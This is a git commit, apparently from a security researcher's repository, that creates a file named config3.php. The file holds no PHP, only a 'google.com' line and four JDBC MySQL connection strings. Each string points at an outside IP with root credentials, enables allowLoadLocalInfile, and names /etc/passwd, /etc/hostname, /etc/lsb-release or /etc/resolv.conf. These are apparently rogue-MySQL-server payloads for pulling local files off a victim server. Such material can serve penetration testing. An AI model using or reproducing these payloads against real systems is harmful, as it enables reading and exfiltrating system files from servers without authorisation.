046cc0e4bc84f3a36bd52167f74ed81ab599a39f
Shubs <infosec-au@users.noreply.github.com>
2024-02-23 16:52:50 +0800

    Create config3.php

---
+++ config3.php
@@ -0,0 +1,6 @@
+google.com
+
+jdbc:mysql://root:root@tcp(51.159.31.124:3306)/%2fetc%2fhostname?allowLoadLocalInfile=true&t=1
+jdbc:mysql://root:root@tcp(51.159.31.124:3306)/%2fetc%2fpasswd?allowLoadLocalInfile=true&t=1
+jdbc:mysql://root:root@tcp(51.159.31.124:3306)/%2fetc%2flsb-release?allowLoadLocalInfile=true&t=1
+jdbc:mysql://root:root@tcp(51.159.31.124:3306)/%2fetc%2fresolv.conf?allowLoadLocalInfile=true&t=1
